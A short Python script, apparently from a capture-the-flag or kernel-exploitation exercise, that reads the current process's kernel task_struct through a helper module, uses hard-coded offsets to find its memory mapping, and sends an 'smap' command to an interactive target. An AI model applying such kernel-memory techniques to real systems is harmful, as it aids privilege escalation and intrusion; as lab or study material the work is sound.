#!/usr/bin/python3
from code import interact
import util2 as util2


files = util2.get_proc_interactive()
strct = util2.get_task_struct(files)
# from jupyter notebook
comm_offset, pid_offset, list_heads, next_offset, mm_offset = (
    1272, 992, [148, 512, 780, 824, 836, 844], 824, 864)
next_offset = list_heads[-3]
mm_offset = list_heads[-1]+4+16

interactive = util2.get_proc_interactive()
target_strct = util2.read_many(files, util2.get_curr(files), 1500)
base, high = util2.map_to_vm(files, target_strct, mm_offset, 0)
files.sendline(f'smap {high} {base}'.encode())
files.recvuntil(b'$$$')
print('comm offset', comm_offset)
print('Got high:', high, 'Got base', base)
files.interactive(prompt='')
